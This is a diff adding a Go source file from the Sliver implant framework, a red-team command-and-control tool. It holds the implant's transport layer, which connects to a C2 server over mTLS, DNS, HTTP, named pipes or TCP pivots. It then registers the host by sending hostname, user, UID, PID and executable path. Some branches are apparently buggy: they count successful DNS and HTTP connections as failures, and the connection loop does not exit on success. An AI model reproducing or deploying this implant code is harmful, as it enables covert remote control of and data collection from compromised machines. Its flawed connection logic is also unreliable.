@@ -1,0 +1,343 @@
+package transports
+
+/*
+	Sliver Implant Framework
+	Copyright (C) 2019  Bishop Fox
+
+	This program is free software: you can redistribute it and/or modify
+	it under the terms of the GNU General Public License as published by
+	the Free Software Foundation, either version 3 of the License, or
+	(at your option) any later version.
+
+	This program is distributed in the hope that it will be useful,
+	but WITHOUT ANY WARRANTY; without even the implied warranty of
+	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+	GNU General Public License for more details.
+
+	You should have received a copy of the GNU General Public License
+	along with this program.  If not, see <https://www.gnu.org/licenses/>.
+*/
+
+import (
+	// {{if .Config.Debug}}
+	"log"
+	// {{end}}
+
+	"errors"
+	"fmt"
+	"io"
+	"net"
+	"net/url"
+	"os"
+	"os/user"
+	"runtime"
+	"strconv"
+	"time"
+
+	"github.com/golang/protobuf/proto"
+
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/sliver/comm"
+	consts "github.com/bishopfox/sliver/sliver/constants"
+	"github.com/bishopfox/sliver/sliver/version"
+)
+
+// Transport - A wrapper around a physical connection, embedding what is necessary to perform
+// connection multiplexing, and RPC layer management around these muxed logical streams.
+// This allows to have different RPC-able streams for parallel work on an implant.
+// Also, these multiplexed streams can be used to route any net.Conn traffic.
+// Some transports use an underlying "physical connection" that is not/does not yield a
+// net.Conn stream, and are therefore unable to use much of the Transport infrastructure.
+type Transport struct {
+	ID  uint64
+	URL *url.URL // URL is used by Sliver's code for CC servers.
+
+	// conn - A physical connection initiated by/on behalf of this transport.
+	// From this conn will be derived one or more streams for different purposes.
+	// Sometimes this conn is not a proper physical connection (like yielded by net.Dial)
+	// but it nonetheless plays the same role. This conn can be nil if the underlying
+	// "physical connection" does not yield a net.Conn.
+	Conn net.Conn
+
+	// The RPC layer added around a net.Conn stream, used by implant to talk with the server.
+	// It is either setup on top of physical conn, or of a muxed stream.
+	// It can be nil if the Transport is tied to a pivoted implant.
+	// If the Transport is the ActiveConnection to the C2 server, this cannot
+	// be nil, as all underlying transports allow to register a RPC layer.
+	C2 *Connection
+}
+
+// newTransport - Eventually, we should have all supported transport transports being
+// instantiated with this function. It will perform all filtering and setup
+// according to the complete URI passed as parameter, and classic templating.
+func newTransport(url *url.URL) (t *Transport, err error) {
+	t = &Transport{
+		ID:  newID(),
+		URL: url,
+	}
+	// {{if .Config.Debug}}
+	log.Printf("New transport (CC= %s)", url.String())
+	// {{end}}
+	return
+}
+
+// Start - Launch all components and routines that will handle all specifications above.
+func (t *Transport) Start(isSwitch bool) (err error) {
+
+	connectionAttempts := 0
+
+	// ConnLoop:
+	for connectionAttempts < maxErrors {
+
+		// We might have several transport protocols available, while some
+		// of which being unable to do stream multiplexing (ex: mTLS + DNS):
+		// we directly set up the C2 RPC layer here when needed, and we will
+		// skip the mux part below if needed.
+		switch t.URL.Scheme {
+		// {{if .Config.MTLSc2Enabled}}
+		case "mtls":
+			// {{if .Config.Debug}}
+			log.Printf("Connecting -> %s", t.URL.Host)
+			// {{end}}
+			lport, err := strconv.Atoi(t.URL.Port())
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("[mtls] Error: failed to parse url.Port%s", t.URL.Host)
+				// {{end}}
+				lport = 8888
+			}
+			t.Conn, err = tlsConnect(t.URL.Hostname(), uint16(lport))
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("[mtls] Connection failed: %s", err)
+				// {{end}}
+				connectionAttempts++
+			}
+			break
+			// {{end}} - MTLSc2Enabled
+		case "dns":
+			// {{if .Config.DNSc2Enabled}}
+			t.C2, err = dnsConnect(t.URL)
+			if err == nil {
+				// {{if .Config.Debug}}
+				log.Printf("[dns] Connection failed: %s", err)
+				// {{end}}
+				connectionAttempts++
+			}
+			break
+			// {{end}} - DNSc2Enabled
+		case "https":
+			fallthrough
+		case "http":
+			// {{if .Config.HTTPc2Enabled}}
+			t.C2, err = httpConnect(t.URL)
+			if err == nil {
+				// {{if .Config.Debug}}
+				log.Printf("[%s] Connection failed: %s", t.URL.Scheme, err)
+				// {{end}}
+				connectionAttempts++
+			}
+			break
+			// {{end}} - HTTPc2Enabled
+		case "namedpipe":
+			// {{if .Config.NamePipec2Enabled}}
+			t.Conn, err = namePipeDial(t.URL)
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("[namedpipe] Connection failed: %s", err)
+				// {{end}}
+				connectionAttempts++
+			}
+			break
+			// {{end}} -NamePipec2Enabled
+		case "tcppivot":
+			// {{if .Config.TCPPivotc2Enabled}}
+			t.C2, err = tcpPivotConnect(t.URL)
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("[tcppivot] Connection failed: %s", err)
+				// {{end}}
+				connectionAttempts++
+			}
+			break
+			// {{end}} -TCPPivotc2Enabled
+		default:
+			err = fmt.Errorf("Unknown c2 protocol: %s", t.URL.Scheme)
+			// {{if .Config.Debug}}
+			log.Printf(err.Error())
+			// {{end}}
+			return
+		}
+	}
+
+	// Set up the Comm subsystem over this transports (either Session tunnel or physical connection)
+	c2stream, err := t.setupComm(isSwitch)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Error during Comm init: %s", err.Error())
+		// {{end}}
+		err = t.phyConnFallBack()
+	}
+
+	// Comms over a physical net.Conn have not registered the Session yet.
+	if c2stream != nil {
+		t.C2, err = setupSessionRPC(c2stream)
+	}
+
+	// {{if .Config.Debug}}
+	log.Printf("Transport %d set up and running (%s)", t.ID, t.URL)
+	// {{end}}
+	return
+}
+
+// setupComm - Set up the Comm subsystem over this transports (either Session tunnel or physical connection)
+// In the case of a physical connection we yield a dedicated stream over which the implant will speak RPC.
+func (t *Transport) setupComm(isSwitch bool) (sessionStream io.ReadWriteCloser, err error) {
+
+	// If we have a started RPC Connection and no net.Conn, we must register the
+	// Session before oppening any tunnel. After this we setup RPC-based Comms.
+	if !isSwitch && t.Conn == nil && t.C2 != nil && t.C2.IsOpen {
+
+		t.C2.Send <- registerSliver()
+
+		// Wait for the server to send a tunnel ID, or timeout
+		select {
+		case id := <-Transports.CommID:
+			tunnel := comm.NewTunnel(id, t.C2.Send)
+			_, err := comm.NewComm().InitClient(tunnel, true, []byte(keyPEM))
+			if err != nil {
+				return nil, err
+			}
+		case <-time.After(defaultNetTimeout):
+			return nil, errors.New("timed out waiting for a Comm Tunnel ID")
+		}
+	}
+
+	// Else, we have a net.Conn from the underlying transport connection, and use this.
+	if !isSwitch && t.Conn != nil {
+		sessionStream, err = comm.NewComm().InitClient(t.Conn, false, []byte(keyPEM))
+	}
+
+	return
+}
+
+// In case we failed to use multiplexing infrastructure, we call here
+// to downgrade to RPC over the transport's physical connection.
+func (t *Transport) phyConnFallBack() (err error) {
+	// {{if .Config.Debug}}
+	log.Printf("[mux] falling back on RPC around physical conn")
+	// {{end}}
+
+	if t.Conn != nil {
+		// Wrap RPC layer around physical conn.
+		t.C2, err = setupSessionRPC(t.Conn)
+	}
+
+	return
+}
+
+// Stop - Gracefully shutdowns all components of this transport. The force parameter is used in case
+// we have a mux transport, and that we want to kill it even if there are pending streams in it.
+func (t *Transport) Stop(force bool) (err error) {
+
+	if t.IsRouting() && !force {
+		return
+		// return fmt.Errorf("Cannot stop transport: %d streams still opened", t.mux.NumStreams())
+	}
+
+	// {{if .Config.Debug}}
+	log.Printf("[mux] closing all muxed streams")
+	// {{end}}
+
+	// Just check the physical connection is not nil and kill it if necessary.
+	if t.Conn != nil {
+		// {{if .Config.Debug}}
+		log.Printf("killing physical connection (%s  ->  %s", t.Conn.LocalAddr(), t.Conn.RemoteAddr())
+		// {{end}}
+		return t.Conn.Close()
+	}
+
+	// {{if .Config.Debug}}
+	log.Printf("Transport closed (%s)", activeC2)
+	// {{end}}
+	return
+}
+
+// IsRouting - The transport checks if it is routing traffic that does not originate from this implant.
+func (t *Transport) IsRouting() bool {
+
+	// if t.IsMux {
+	//         activeStreams := t.mux.NumStreams()
+	//         // If there is an active C2, there is at least one open stream,
+	//         // that we do not count as "important" when stopping the Transport.
+	//         if (t.C2 != nil && activeStreams > 1) || (t.C2 == nil && activeStreams > 0) {
+	//                 return true
+	//         }
+	//         // Else we don't have any non-implant streams.
+	//         return false
+	// }
+	// If no mux, no routing.
+	return false
+}
+
+func registerSliver() *sliverpb.Envelope {
+	hostname, err := os.Hostname()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Failed to determine hostname %s", err)
+		// {{end}}
+		hostname = ""
+	}
+	currentUser, err := user.Current()
+	if err != nil {
+
+		// {{if .Config.Debug}}
+		log.Printf("Failed to determine current user %s", err)
+		// {{end}}
+
+		// Gracefully error out
+		currentUser = &user.User{
+			Username: "<< error >>",
+			Uid:      "<< error >>",
+			Gid:      "<< error >>",
+		}
+
+	}
+	filename, err := os.Executable()
+	// Should not happen, but still...
+	if err != nil {
+		//TODO: build the absolute path to os.Args[0]
+		if 0 < len(os.Args) {
+			filename = os.Args[0]
+		} else {
+			filename = "<< error >>"
+		}
+	}
+	data, err := proto.Marshal(&sliverpb.Register{
+		Name:              consts.SliverName,
+		Hostname:          hostname,
+		Username:          currentUser.Username,
+		Uid:               currentUser.Uid,
+		Gid:               currentUser.Gid,
+		Os:                runtime.GOOS,
+		Version:           version.GetVersion(),
+		Arch:              runtime.GOARCH,
+		Pid:               int32(os.Getpid()),
+		Filename:          filename,
+		ActiveC2:          GetActiveC2(),
+		ReconnectInterval: uint32(GetReconnectInterval() / time.Second),
+		// Network & transport information.
+		Transport:  Transports.Server.URL.Scheme,
+		RemoteAddr: Transports.Server.Conn.LocalAddr().String(),
+	})
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Failed to encode register msg %s", err)
+		// {{end}}
+		return nil
+	}
+	return &sliverpb.Envelope{
+		Type: sliverpb.MsgRegister,
+		Data: data,
+	}
+}
